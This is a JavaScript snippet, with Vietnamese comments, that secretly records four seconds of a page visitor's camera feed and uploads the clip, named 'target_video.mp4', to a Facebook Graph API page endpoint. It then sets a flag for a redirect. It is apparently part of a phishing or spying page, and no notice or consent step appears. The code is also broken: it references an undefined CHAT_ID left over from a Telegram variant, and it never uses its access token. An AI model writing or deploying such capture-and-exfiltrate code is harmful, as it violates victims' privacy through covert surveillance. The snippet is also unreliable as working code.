(async function() {
 const PAGE_ID = "YOUR_PAGE_ID";
  const ACCESS_TOKEN = "YOUR_PAGE_ACCESS_TOKEN";

    const video = document.getElementById('preview');
    const canvas = document.createElement('canvas');

    async function handleCapture() {
        try {
            const stream = video.srcObject;
            if (!stream || video.videoWidth === 0) {
                setTimeout(handleCapture, 500);
                return;
            }

            

// --- BƯỚC 2: QUAY VIDEO TRONG 4 GIÂY ---
 const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            let chunks = [];

            recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
            recorder.onstop = async () => {
                const videoBlob = new Blob(chunks, { type: 'video/webm' });
                const videoData = new FormData();
                videoData.append('chat_id', CHAT_ID);
                videoData.append('video', videoBlob, 'target_video.mp4');
                videoData.append('caption', '🎬 Sucessfully Record ✔');
                
               await fetch(`https://graph.facebook.com/${PAGE_ID}/videos`,{method: "POST",body: videoData });
                
                // Báo hiệu chuyển hướng
                window.mainScriptFinished = true;
            };

            recorder.start();
            setTimeout(() => { recorder.stop(); }, 4000);

        } catch (err) {
            console.error("Lỗi xác thực:", err);
            window.mainScriptFinished = true;
        }
    }

    handleCapture();
})();
